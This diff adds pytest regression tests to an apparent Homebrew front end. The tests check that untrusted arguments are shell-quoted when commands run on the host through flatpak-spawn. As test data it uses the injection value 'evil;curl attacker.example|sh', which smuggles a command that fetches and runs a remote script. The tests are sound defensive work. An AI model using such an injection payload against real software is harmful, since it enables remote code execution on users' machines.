@@ -300,6 +300,31 @@ class TestBrewCmd:
         assert '--host' in cmd
         assert 'brew install git' in ' '.join(cmd)
 
+    def test_flatpak_shell_quotes_untrusted_args(self, monkeypatch):
+        # Regression test for the host-injection vector: args derive from
+        # untrusted input (tap .rb filenames, Brewfile contents, GitHub tap
+        # search). An unquoted ``evil;curl host|sh`` would run on the HOST
+        # via flatpak-spawn --host; it must be single-quoted instead.
+        import tavern.backend as bmod
+        monkeypatch.setattr(bmod, 'IN_FLATPAK', True)
+        cmd = _brew_cmd(['install', 'evil;curl attacker.example|sh'])
+        joined = ' '.join(cmd)
+        # The dangerous metacharacters must not be executable: the arg is
+        # wrapped in single quotes inside the bash -c string.
+        assert "'evil;curl attacker.example|sh'" in joined
+        # Sanity: the command string must still contain the brew invocation.
+        assert 'brew install' in joined
+        assert ';curl' not in joined.split("'evil")[0]
+
+    def test_non_flatpak_still_list_exec(self, monkeypatch):
+        # The non-Flatpak path is a plain argv list — no shell involved, so
+        # no quoting needed; metacharacters stay inert.
+        import tavern.backend as bmod
+        monkeypatch.setattr(bmod, 'IN_FLATPAK', False)
+        monkeypatch.setattr(bmod, 'BREW_BIN', '/usr/local/bin/brew')
+        cmd = _brew_cmd(['install', 'evil;curl attacker.example|sh'])
+        assert cmd == ['/usr/local/bin/brew', 'install', 'evil;curl attacker.example|sh']
+
 
 # ─── Minimal .rb parsing ────────────────────────────────────────────────────
 
